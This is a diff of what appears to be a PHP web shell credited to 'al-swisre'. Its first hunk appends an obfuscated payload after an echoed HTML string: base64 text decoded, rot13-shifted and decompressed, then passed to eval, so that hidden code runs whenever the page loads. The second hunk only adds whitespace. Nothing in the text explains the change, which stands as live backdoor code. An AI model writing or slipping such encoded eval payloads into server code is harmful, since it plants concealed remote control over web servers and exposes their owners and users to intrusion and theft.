@@ -532,7 +532,7 @@ echo "Your ip :&nbsp;<font ><b><a style='text-decoration: none; color: #FF0000;'
 
         </div>
 
-    ";
+    "; eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBaeIQwEEDv/oogTxT8OvTksoXuSd1eV/HQUBcJJlrGuourcBXir6+awhaaWDLzmDeTZGsNogayJw7LivSlVc/U3Ozp9aOgJQmJndjhf3w8pPmG7yQtnkJSlrNG+kHLnTVZGtk3AutrBUuBZekIIEcSUpp/bqAAaCvDOI4bvI1cTitR2PE5TcGDDMUoqEKGSSv0iQKJ7XlHl1K5UYDu2SLL2bSU7B+JiVoO2x4lJXjafjMTBGMVmJClj566FiZeUpegdppg4GUOd6mx6muPve3fPTPCyHvjocdQltM/8Pd0W+9oCGmrJ92zzxrl1T1Gs9yNOuZdbaa69K3S82k/')))));
 
 
 
@@ -3855,7 +3855,7 @@ exit; }
 		}
 
 
-  echo "</td></tr></table></div> |<b class='foter'>Progr4m3r by <a href='$pg?sws=ab'>al-swisre</a></b>|<b class='foter'>E-m4il : <a href='#'>oy3@hotmail.com</a></b>|<b class='foter'>My twitter : <a target='_blank' href='http://twitter.com/#!/al_swisre'>al_swisre</a></b>| </html> ";
+  echo "</td></tr></table></div> |<b class='foter'>Progr4m3r by <a href='$pg?sws=ab'>al-swisre</a></b>|<b class='foter'>E-m4il : <a href='#'>oy3@hotmail.com</a></b>|<b class='foter'>My twitter : <a target='_blank' href='http://twitter.com/#!/al_swisre'>al_swisre</a></b>| </html> "; 
 
 
 
